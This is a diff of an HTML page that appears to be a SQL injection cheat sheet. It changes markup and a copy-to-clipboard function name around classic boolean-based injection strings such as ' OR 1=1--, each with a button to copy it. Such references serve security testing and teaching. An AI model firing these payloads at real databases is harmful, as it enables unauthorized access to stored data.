@@ -44,13 +44,13 @@
 <summary>HIDDEN DATA TECHNIQUES</summary>
 <p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
 
-If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean conditions are used.</p>
-
-<p id="HDT01"><mark>' OR 1=1--</mark></p> TRUE 
+If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean conditions are used.
+	
+<p id="HDT01"><mark>' OR 1=1--</mark></p>TRUE 
 <p id="HDT02"><mark>' and 'a'='a--</mark></p>
 <p id="HDT03"><mark>' and 1=2;--</mark></p>
 	
-<button onclick="copyToClipboard('#HDT01')">C01</button> | <button onclick="copyToClipboard('#HDT02')">C02</button> | <button onclick="copyToClipboard('#HDT03')">C03</button>
+<button onclick="copy_To_Clipboard('#HDT01')">C01</button> | <button onclick="copy_To_Clipboard('#HDT02')">C02</button> | <button onclick="copy_To_Clipboard('#HDT03')">C03</button></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
